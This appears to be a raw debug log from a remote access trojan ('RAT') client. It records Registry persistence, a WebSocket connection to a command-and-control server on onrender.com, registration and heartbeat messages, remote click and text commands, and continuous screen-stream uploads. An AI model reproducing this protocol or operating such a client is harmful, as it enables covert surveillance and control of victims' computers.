2026-08-22 18:49:06,705 - INFO - Persistence added to Windows Registry
2026-08-22 18:49:06,705 - INFO - Bot 5fe26132-ec6a-4e15-8a9f-6183f82b2d07 started (version 1.0.0)
2026-08-22 18:49:07,100 - INFO - Connected to wss://c2-server-exj9.onrender.com/ws as 5fe26132-ec6a-4e15-8a9f-6183f82b2d07
2026-08-22 18:50:09,081 - INFO - Stream task cancelled
2026-08-22 18:50:45,057 - INFO - Stream task cancelled
2026-08-22 18:52:08,766 - INFO - Bot stopped by user
2026-08-22 18:55:15,878 - DEBUG - Using proactor: IocpProactor
2026-08-22 18:55:15,941 - DEBUG - = connection is CONNECTING
2026-08-22 18:55:16,008 - DEBUG - > GET /ws HTTP/1.1
2026-08-22 18:55:16,008 - DEBUG - > Host: c2-server-exj9.onrender.com
2026-08-22 18:55:16,008 - DEBUG - > Upgrade: websocket
2026-08-22 18:55:16,008 - DEBUG - > Connection: Upgrade
2026-08-22 18:55:16,008 - DEBUG - > Sec-WebSocket-Key: q37K+zCzpzoZrW7BbIJFVg==
2026-08-22 18:55:16,008 - DEBUG - > Sec-WebSocket-Version: 13
2026-08-22 18:55:16,008 - DEBUG - > Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
2026-08-22 18:55:16,008 - DEBUG - > User-Agent: Python/3.11 websockets/17.0.1
2026-08-22 18:55:16,304 - DEBUG - < HTTP/1.1 101 Switching Protocols
2026-08-22 18:55:16,304 - DEBUG - < Date: Sat, 22 Aug 2026 11:54:55 GMT
2026-08-22 18:55:16,305 - DEBUG - < Connection: upgrade
2026-08-22 18:55:16,305 - DEBUG - < Upgrade: websocket
2026-08-22 18:55:16,305 - DEBUG - < Sec-WebSocket-Accept: 6TW5ax8yPBKNCXwco2Hv2C2o4AE=
2026-08-22 18:55:16,305 - DEBUG - < cf-cache-status: DYNAMIC
2026-08-22 18:55:16,305 - DEBUG - < Server: cloudflare
2026-08-22 18:55:16,305 - DEBUG - < CF-RAY: a2f1af7d585e043f-HKG
2026-08-22 18:55:16,305 - DEBUG - < alt-svc: h3=":443"; ma=86400
2026-08-22 18:55:16,305 - DEBUG - = connection is OPEN
2026-08-22 18:55:16,305 - DEBUG - > TEXT '{"type": "register", "bot_id": "5fe26132-ec6a-4... "screen_height": 1080}' [196 bytes]
2026-08-22 18:55:16,306 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...mp": 1787399716.306437}' [103 bytes]
2026-08-22 18:55:16,381 - DEBUG - < TEXT '{"type":"registered","bot_id":"5fe26132-ec6a-4e15-8a9f-6183f82b2d07"}' [69 bytes]
2026-08-22 18:55:16,381 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399716.3814037}' [104 bytes]
2026-08-22 18:55:24,600 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997..."rat_start","args":[]}}' [96 bytes]
2026-08-22 18:55:24,601 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399703397-a43...arted", "status": "ok"}' [95 bytes]
2026-08-22 18:55:24,601 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...mp": 1787399724.601441}' [103 bytes]
2026-08-22 18:55:24,767 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...rat_stream","args":[]}}' [97 bytes]
2026-08-22 18:55:24,768 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399703565-2ac...arted", "status": "ok"}' [98 bytes]
2026-08-22 18:55:24,769 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399724.7690856}' [104 bytes]
2026-08-22 18:55:24,836 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399724.836347}' [78984 bytes]
2026-08-22 18:55:25,187 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399725.187397}' [78984 bytes]
2026-08-22 18:55:25,530 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399725.5291824}' [78985 bytes]
2026-08-22 18:55:25,871 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399725.8709595}' [78985 bytes]
2026-08-22 18:55:26,218 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399726.2180834}' [78985 bytes]
2026-08-22 18:55:26,298 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...gs":["click",540,302]}}' [111 bytes]
2026-08-22 18:55:26,403 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399705097-cf4... sent", "status": "ok"}' [94 bytes]
2026-08-22 18:55:26,403 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399726.4036043}' [104 bytes]
2026-08-22 18:55:26,560 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399726.5593944}' [78985 bytes]
2026-08-22 18:55:26,898 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399726.8976612}' [78985 bytes]
2026-08-22 18:55:27,246 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...stamp": 1787399727.246}' [78981 bytes]
2026-08-22 18:55:27,592 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399727.5912588}' [78985 bytes]
2026-08-22 18:55:27,729 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...gs":["click",349,274]}}' [111 bytes]
2026-08-22 18:55:27,832 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399706528-975... sent", "status": "ok"}' [94 bytes]
2026-08-22 18:55:27,832 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399727.8322985}' [104 bytes]
2026-08-22 18:55:27,932 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399727.9320407}' [78985 bytes]
2026-08-22 18:55:28,277 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399728.277775}' [78984 bytes]
2026-08-22 18:55:28,624 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399728.6248014}' [78985 bytes]
2026-08-22 18:55:28,978 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399728.9786754}' [78985 bytes]
2026-08-22 18:55:29,325 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399729.325457}' [78984 bytes]
2026-08-22 18:55:29,679 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399729.6782486}' [78985 bytes]
2026-08-22 18:55:30,014 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399730.014545}' [78984 bytes]
2026-08-22 18:55:30,362 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399730.3629622}' [78985 bytes]
2026-08-22 18:55:30,708 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399730.7088606}' [78985 bytes]
2026-08-22 18:55:31,050 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399731.0495036}' [78985 bytes]
2026-08-22 18:55:31,391 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399731.390395}' [78984 bytes]
2026-08-22 18:55:31,727 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399731.7277696}' [78985 bytes]
2026-08-22 18:55:32,072 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399732.0720813}' [78985 bytes]
2026-08-22 18:55:32,412 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399732.4125903}' [78985 bytes]
2026-08-22 18:55:32,754 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399732.7545366}' [78985 bytes]
2026-08-22 18:55:33,099 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...amp": 1787399733.09903}' [78983 bytes]
2026-08-22 18:55:33,440 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399733.4401598}' [78985 bytes]
2026-08-22 18:55:33,789 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399733.7885573}' [78985 bytes]
2026-08-22 18:55:34,127 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399734.1260087}' [78985 bytes]
2026-08-22 18:55:34,474 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399734.4734585}' [78985 bytes]
2026-08-22 18:55:34,820 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399734.8190331}' [78985 bytes]
2026-08-22 18:55:35,166 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399735.1656067}' [78985 bytes]
2026-08-22 18:55:35,512 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399735.5125368}' [78985 bytes]
2026-08-22 18:55:35,853 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399735.8534312}' [78985 bytes]
2026-08-22 18:55:36,198 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399736.198983}' [78984 bytes]
2026-08-22 18:55:36,318 - DEBUG - > PING a1 b1 0c 29 [binary, 4 bytes]
2026-08-22 18:55:36,318 - DEBUG - % sent keepalive ping
2026-08-22 18:55:36,386 - DEBUG - < PONG a1 b1 0c 29 [binary, 4 bytes]
2026-08-22 18:55:36,387 - DEBUG - % received keepalive pong
2026-08-22 18:55:36,540 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399736.540536}' [78984 bytes]
2026-08-22 18:55:36,887 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399736.8861063}' [78985 bytes]
2026-08-22 18:55:37,226 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399737.2261472}' [78985 bytes]
2026-08-22 18:55:37,573 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399737.573367}' [78984 bytes]
2026-08-22 18:55:37,669 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997..."rat_start","args":[]}}' [96 bytes]
2026-08-22 18:55:37,669 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399716467-e58...arted", "status": "ok"}' [95 bytes]
2026-08-22 18:55:37,670 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399737.6703258}' [104 bytes]
2026-08-22 18:55:37,851 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...rat_stream","args":[]}}' [97 bytes]
2026-08-22 18:55:37,851 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399716649-188...arted", "status": "ok"}' [98 bytes]
2026-08-22 18:55:37,851 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399737.8515892}' [104 bytes]
2026-08-22 18:55:37,908 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...amp": 1787399737.90872}' [78983 bytes]
2026-08-22 18:55:38,256 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399738.256428}' [78984 bytes]
2026-08-22 18:55:38,601 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399738.6009612}' [78985 bytes]
2026-08-22 18:55:38,941 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399738.9417045}' [78985 bytes]
2026-08-22 18:55:39,287 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399739.2869318}' [78985 bytes]
2026-08-22 18:55:39,629 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399739.6298127}' [78985 bytes]
2026-08-22 18:55:39,969 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399739.9696813}' [78985 bytes]
2026-08-22 18:55:40,315 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399740.3144608}' [78985 bytes]
2026-08-22 18:55:40,657 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399740.6572716}' [78985 bytes]
2026-08-22 18:55:41,003 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399741.0028062}' [78985 bytes]
2026-08-22 18:55:41,343 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399741.3422365}' [78985 bytes]
2026-08-22 18:55:41,688 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399741.6888025}' [78985 bytes]
2026-08-22 18:55:42,026 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399742.0251317}' [78985 bytes]
2026-08-22 18:55:42,371 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399742.3713925}' [78985 bytes]
2026-08-22 18:55:42,713 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399742.7120242}' [78985 bytes]
2026-08-22 18:55:43,059 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399743.0585277}' [78985 bytes]
2026-08-22 18:55:43,404 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399743.4035342}' [78985 bytes]
2026-08-22 18:55:43,747 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399743.7460606}' [78985 bytes]
2026-08-22 18:55:44,086 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399744.0868974}' [78985 bytes]
2026-08-22 18:55:44,432 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399744.4314985}' [78985 bytes]
2026-08-22 18:55:44,773 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399744.773789}' [78984 bytes]
2026-08-22 18:55:45,115 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399745.1153765}' [78985 bytes]
2026-08-22 18:55:45,231 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...s":["rightclick",0,0]}}' [112 bytes]
2026-08-22 18:55:45,436 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399724029-96c... sent", "status": "ok"}' [100 bytes]
2026-08-22 18:55:45,436 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399745.4368272}' [104 bytes]
2026-08-22 18:55:45,470 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399745.4704716}' [81793 bytes]
2026-08-22 18:55:45,817 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399745.8166077}' [81793 bytes]
2026-08-22 18:55:45,822 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...":["doubleclick",0,0]}}' [113 bytes]
2026-08-22 18:55:45,925 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399724620-950... sent", "status": "ok"}' [101 bytes]
2026-08-22 18:55:45,926 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399745.9264836}' [104 bytes]
2026-08-22 18:55:46,161 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399746.1618087}' [81793 bytes]
2026-08-22 18:55:46,504 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399746.5041687}' [81793 bytes]
2026-08-22 18:55:46,851 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399746.8516243}' [81861 bytes]
2026-08-22 18:55:47,187 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399747.1871285}' [81793 bytes]
2026-08-22 18:55:47,533 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399747.5325103}' [78985 bytes]
2026-08-22 18:55:47,757 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...":["doubleclick",0,0]}}' [113 bytes]
2026-08-22 18:55:47,864 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399726556-664... sent", "status": "ok"}' [101 bytes]
2026-08-22 18:55:47,864 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787399747.8646631}' [104 bytes]
2026-08-22 18:55:47,897 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399747.8979006}' [99457 bytes]
2026-08-22 18:55:48,237 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399748.2368724}' [99457 bytes]
2026-08-22 18:55:48,576 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399748.576282}' [99456 bytes]
2026-08-22 18:55:48,924 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399748.924801}' [99456 bytes]
2026-08-22 18:55:49,266 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399749.2661629}' [99457 bytes]
2026-08-22 18:55:49,606 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399749.606287}' [99436 bytes]
2026-08-22 18:55:49,948 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399749.9489548}' [79021 bytes]
2026-08-22 18:55:50,296 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399750.2963736}' [78985 bytes]
2026-08-22 18:55:50,636 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...amp": 1787399750.63628}' [78983 bytes]
2026-08-22 18:55:50,979 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399750.9796717}' [78985 bytes]
2026-08-22 18:55:51,323 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399751.3231003}' [78985 bytes]
2026-08-22 18:55:51,668 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399751.668177}' [78984 bytes]
2026-08-22 18:55:52,015 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399752.0153372}' [78985 bytes]
2026-08-22 18:55:52,356 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399752.3551095}' [78985 bytes]
2026-08-22 18:55:52,700 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399752.700138}' [78984 bytes]
2026-08-22 18:55:53,057 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399753.0574195}' [78985 bytes]
2026-08-22 18:55:53,399 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399753.3986146}' [78985 bytes]
2026-08-22 18:55:53,739 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399753.738734}' [78984 bytes]
2026-08-22 18:55:54,079 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399754.0789566}' [78985 bytes]
2026-08-22 18:55:54,421 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399754.421363}' [78984 bytes]
2026-08-22 18:55:54,766 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399754.7668455}' [78985 bytes]
2026-08-22 18:55:55,110 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399755.1100447}' [78985 bytes]
2026-08-22 18:55:55,455 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399755.4554465}' [78985 bytes]
2026-08-22 18:55:55,792 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...tamp": 1787399755.7926}' [78982 bytes]
2026-08-22 18:55:56,139 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399756.138758}' [78984 bytes]
2026-08-22 18:55:56,336 - DEBUG - > PING 6f 73 b1 a9 [binary, 4 bytes]
2026-08-22 18:55:56,336 - DEBUG - % sent keepalive ping
2026-08-22 18:55:56,406 - DEBUG - < PONG 6f 73 b1 a9 [binary, 4 bytes]
2026-08-22 18:55:56,406 - DEBUG - % received keepalive pong
2026-08-22 18:55:56,477 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399756.476978}' [78984 bytes]
2026-08-22 18:55:56,823 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399756.8230503}' [78985 bytes]
2026-08-22 18:55:57,166 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399757.1658523}' [78985 bytes]
2026-08-22 18:55:57,510 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399757.5102208}' [78985 bytes]
2026-08-22 18:55:57,857 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399757.8574946}' [78985 bytes]
2026-08-22 18:55:58,199 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399758.199321}' [78984 bytes]
2026-08-22 18:55:58,547 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399758.5479333}' [78985 bytes]
2026-08-22 18:55:58,901 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399758.9013815}' [78985 bytes]
2026-08-22 18:55:59,244 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399759.2441113}' [78985 bytes]
2026-08-22 18:55:59,582 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399759.5829964}' [78985 bytes]
2026-08-22 18:55:59,928 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399759.9282768}' [78985 bytes]
2026-08-22 18:56:00,277 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399760.2779691}' [78993 bytes]
2026-08-22 18:56:00,628 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399760.6288896}' [78993 bytes]
2026-08-22 18:56:00,980 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399760.9805863}' [78993 bytes]
2026-08-22 18:56:01,321 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399761.3218973}' [78993 bytes]
2026-08-22 18:56:01,667 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399761.6674187}' [78993 bytes]
2026-08-22 18:56:02,007 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399762.0069194}' [78993 bytes]
2026-08-22 18:56:02,349 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399762.3499427}' [78993 bytes]
2026-08-22 18:56:02,694 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399762.6947885}' [78993 bytes]
2026-08-22 18:56:03,034 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399763.0348265}' [78993 bytes]
2026-08-22 18:56:03,318 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17873997...d","args":["HEXTEKO"]}}' [107 bytes]
2026-08-22 18:56:05,048 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787399742116-c6e...chars", "status": "ok"}' [113 bytes]
2026-08-22 18:56:05,049 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...mp": 1787399765.049405}' [103 bytes]
2026-08-22 18:56:05,086 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399765.0852153}' [85477 bytes]
2026-08-22 18:56:05,427 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399765.4276352}' [85429 bytes]
2026-08-22 18:56:05,767 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399765.7675006}' [85457 bytes]
2026-08-22 18:56:06,113 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399766.1137815}' [85457 bytes]
2026-08-22 18:56:06,459 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399766.459023}' [85428 bytes]
2026-08-22 18:56:06,798 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399766.7985961}' [85429 bytes]
2026-08-22 18:56:07,146 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399767.1468267}' [85457 bytes]
2026-08-22 18:56:07,502 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399767.5022113}' [85297 bytes]
2026-08-22 18:56:07,846 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399767.8460956}' [85157 bytes]
2026-08-22 18:56:08,186 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399768.1865182}' [84949 bytes]
2026-08-22 18:56:08,530 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399768.5303862}' [84949 bytes]
2026-08-22 18:56:08,872 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399768.8728275}' [84853 bytes]
2026-08-22 18:56:09,219 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399769.2199333}' [85033 bytes]
2026-08-22 18:56:09,566 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399769.5654948}' [78861 bytes]
2026-08-22 18:56:09,921 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399769.921231}' [78912 bytes]
2026-08-22 18:56:10,275 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399770.2750638}' [78957 bytes]
2026-08-22 18:56:10,623 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399770.6237617}' [140721 bytes]
2026-08-22 18:56:10,974 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399770.9745326}' [140813 bytes]
2026-08-22 18:56:11,326 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399771.325433}' [140812 bytes]
2026-08-22 18:56:11,679 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399771.678321}' [140812 bytes]
2026-08-22 18:56:12,016 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399772.0161452}' [140813 bytes]
2026-08-22 18:56:12,363 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399772.363673}' [140812 bytes]
2026-08-22 18:56:12,706 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399772.7065618}' [140169 bytes]
2026-08-22 18:56:13,043 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399773.0435543}' [140813 bytes]
2026-08-22 18:56:13,394 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399773.3945374}' [140813 bytes]
2026-08-22 18:56:13,736 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...mp": 1787399773.734853}' [140672 bytes]
2026-08-22 18:56:14,088 - DEBUG - > TEXT '{"type": "rat_stream", "bot_id": "5fe26132-ec6a...p": 1787399774.0877767}' [140753 bytes]
